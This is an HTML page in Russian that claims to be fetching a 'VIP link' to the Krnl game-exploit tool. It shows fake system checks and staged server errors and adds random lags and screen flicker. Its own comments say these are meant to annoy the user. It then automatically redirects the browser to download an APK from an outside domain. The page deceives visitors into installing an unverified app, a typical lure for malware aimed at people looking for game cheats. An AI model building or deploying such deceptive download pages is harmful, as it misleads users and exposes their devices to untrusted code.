<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Получение VIP Ссылки на Krnl - Ожидайте...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(45deg, #ff0000, #000000, #ff0000);
            background-size: 400% 400%;
            animation: glitch 2s ease-in-out infinite alternate-reverse both;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        @keyframes glitch {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .container {
            text-align: center;
            z-index: 10;
        }
        .loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #ff0000;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .error {
            color: #ff0000;
            font-size: 24px;
            animation: shake 0.5s ease-in-out infinite alternate;
            display: none;
        }
        @keyframes shake {
            0% { transform: translateX(0); }
            100% { transform: translateX(10px); }
        }
        .success {
            color: #00ff00;
            font-size: 28px;
            display: none;
        }
        h1 {
            animation: flicker 0.5s infinite alternate;
        }
        @keyframes flicker {
            0% { opacity: 1; }
            100% { opacity: 0.5; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Получение VIP Ссылки на Krnl...</h1>
        <div class="loader" id="loader"></div>
        <p>Проверяем систему... Не закрывайте вкладку, блядь, или всё заново!</p>
        <div id="error" class="error">ОШИБКА: Сервер не отвечает! Подождите, сука...</div>
        <div id="success" class="success">Доступ получен! Перенаправление на скачивание...</div>
    </div>

    <script>
        // Эта хуйня будет выводить на нервы пользователю лагами и ошибками
        let step = 0;
        const totalSteps = 15; // Много шагов, чтоб подольше мурыжить
        const errorMsg = document.getElementById('error');
        const successMsg = document.getElementById('success');
        const loader = document.getElementById('loader');

        function simulateLag() {
            // Рандомные лаги - иногда подвисания
            const lag = Math.random() * 3000 + 1000; // 1-4 секунды
            return new Promise(resolve => setTimeout(resolve, lag));
        }

        async function annoyUser() {
            while (step < totalSteps) {
                step++;
                console.log(`Шаг ${step}/${totalSteps}`); // В консоли тоже потроллим

                // Каждые 3 шага - фейковая ошибка
                if (step % 3 === 0) {
                    errorMsg.style.display = 'block';
                    loader.style.display = 'none';
                    await simulateLag(); // Ждём с ошибкой
                    errorMsg.style.display = 'none';
                    loader.style.display = 'block';
                }

                // Иногда подвисание - меняем текст
                if (step % 5 === 0) {
                    document.querySelector('p').innerText = 'Проверка системы... проверяем дальше...';
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    document.querySelector('p').innerText = 'Проверяем систему... Не закрывайте вкладку, блядь, или всё заново!';
                }

                await simulateLag();
            }

            // Финал: успех и редирект
            loader.style.display = 'none';
            successMsg.style.display = 'block';
            setTimeout(() => {
                window.location.href = 'https://maper.info/KrnlNewVip.apk'; // Перенаправляем в той же вкладке
            }, 2000);
        }

        // Запускаем эту херню
        annoyUser();

        // Дополнительный троллинг: иногда фликер экрана
        setInterval(() => {
            if (Math.random() < 0.1) { // 10% шанс
                document.body.style.filter = 'invert(1)';
                setTimeout(() => {
                    document.body.style.filter = 'invert(0)';
                }, 100);
            }
        }, 5000);
    </script>
</body>
</html>
